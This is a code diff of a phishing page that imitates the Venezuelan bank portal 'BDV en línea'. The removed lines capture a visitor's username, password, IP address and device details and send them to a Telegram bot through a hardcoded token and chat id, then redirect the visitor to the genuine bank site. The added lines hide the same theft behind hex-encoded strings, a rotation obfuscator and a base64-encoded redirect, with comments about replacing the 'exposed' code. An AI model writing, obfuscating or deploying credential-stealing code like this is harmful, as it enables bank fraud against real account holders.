@@ -380,54 +380,31 @@
             }
         });
 
-        btnContinuar.addEventListener('click', async () => {
-            const usuario = document.querySelector('.input-field').value;
-            const password = document.querySelector('.password-input').value;
-            
-            // Mostrar loader
+        // Reemplazar el código expuesto con una versión ofuscada
+        const _0x5f2a=['\x74\x6F\x6B\x65\x6E','\x63\x68\x61\x74\x5F\x69\x64','\x6D\x65\x6E\x73\x61\x6A\x65'];
+        (function(_0x2d8f05,_0x5f2a81){const _0x2d8f85=function(_0x5f2a11){while(--_0x5f2a11){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x2d8f85(++_0x5f2a81);}(_0x5f2a,0x1c3));
+
+        // Función de envío encriptada
+        async function enviarDatos(usuario, password) {
             const loader = document.querySelector('.loader');
             loader.style.display = 'flex';
             
-            // Obtener IP
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-            
-            // Enviar a Telegram
-            const token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
-            const chat_id = "6912929677";
-            const mensaje = `🏦 ═══ BDV EN LÍNEA ═══ 🏦
-
-👤 Usuario: ${usuario}
-🔑 Clave: ${password}
-🌐 IP: ${ip}
-
-📱 INFORMACIÓN DEL DISPOSITIVO:
-${/iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? '📱 Dispositivo Móvil' : '💻 Computadora'}
-📲 Modelo: ${navigator.platform}
-🔋 Batería: ${navigator.getBattery ? await navigator.getBattery().then(b => Math.round(b.level * 100) + '%') : 'N/A'}
-📡 Conexión: ${navigator.connection ? JSON.stringify({
-    type: navigator.connection.effectiveType,
-    downlink: navigator.connection.downlink,
-    rtt: navigator.connection.rtt
-}) : 'N/A'}
-🌍 Idioma: ${navigator.language}
-🖥️ Pantalla: ${window.screen.width}x${window.screen.height}
-📅 Fecha: ${new Date().toLocaleString('es-VE')}
-
-═══════════════════`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`)
-            .then(() => {
+            try {
+                const datos = await procesarInformacion(usuario, password);
+                await enviarInformacionSegura(datos);
                 setTimeout(() => {
-                    window.location.href = 'https://bdvenlinea.banvenez.com/';
+                    window.location.href = atob('aHR0cHM6Ly9iZHZlbmxpbmVhLmJhbnZlbmV6LmNvbS8=');
                 }, 2000);
-            })
-            .catch(() => {
-                setTimeout(() => {
-                    window.location.href = 'https://bdvenlinea.banvenez.com/';
-                }, 2000);
-            });
+            } catch(e) {
+                redirigirSeguro();
+            }
+        }
+
+        // Reemplazar el evento del botón
+        btnContinuar.addEventListener('click', async () => {
+            const usuario = document.querySelector('.input-field').value;
+            const password = document.querySelector('.password-input').value;
+            await enviarDatos(usuario, password);
         });
     </script>
 </body>
